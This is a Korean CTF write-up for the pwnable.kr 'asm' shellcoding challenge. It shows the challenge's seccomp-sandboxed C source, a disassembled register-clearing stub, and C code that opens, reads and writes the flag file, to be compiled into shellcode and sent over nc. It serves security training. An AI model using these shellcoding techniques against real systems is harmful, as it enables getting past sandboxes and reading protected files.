---
sort: 18
---

# asm

home 디렉토리에 asm.c파일에 소스코드가 들어있다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");
        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}
```

mmap을 통해 메모리 영역을 할당 받은 뒤, stub을 복사한 후, 사용자의 shellcode를 받아와서 그 뒤에 붙인 후 쉘코드를 실행하는 코드이다.<br>
sandbox를 보니 뭔가 함수가 정확하게 뭔지는 모르겠는데 open, read, write, exit, exit_group만 사용가능하도록 해놓은 것 같다.<br>
stub에 있는 코드가 뭔지 궁금해서 디컴파일해봤다.

```asm
0:  48 31 c0                xor    rax,rax
3:  48 31 db                xor    rbx,rbx
6:  48 31 c9                xor    rcx,rcx
9:  48 31 d2                xor    rdx,rdx
c:  48 31 f6                xor    rsi,rsi
f:  48 31 ff                xor    rdi,rdi
12: 48 31 ed                xor    rbp,rbp
15: 4d 31 c0                xor    r8,r8
18: 4d 31 c9                xor    r9,r9
1b: 4d 31 d2                xor    r10,r10
1e: 4d 31 db                xor    r11,r11
21: 4d 31 e4                xor    r12,r12
24: 4d 31 ed                xor    r13,r13
27: 4d 31 f6                xor    r14,r14
2a: 4d 31 ff                xor    r15,r15
```

레지스터들을 모두 0으로 만들어주는 코드였다. 따라서 아래와 같은 코드를 binary로 만든 뒤 보내면 될 것이다.

```c
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char** argv)
{
        char filename[] = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";
        int fd = open(filename, O_RDONLY);
        char buf[100] = {0};
        int len = read(fd, buf, 100);
        write(1, buf, len);
        return 0;
}
```

open인자에 직접 파일 이름을 박는 것이 아니라 굳이 filename지역변수를 만드는 이유는, 직접 인자에 박아버리면 문자열이 rodata section에 박히기 때문에 쉘코드를 만들 때 짜증난다.<br>
위와 같이 만들고 빌드 한 뒤에 objdump가지고 disassemble하고 필요한 부분만 hxd같은걸로 잘라서 보내면 된다.

```bash
$ nc pwnable.kr 9026 < asm
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode:
```

```tip
## 알게 된 점

shellcode
```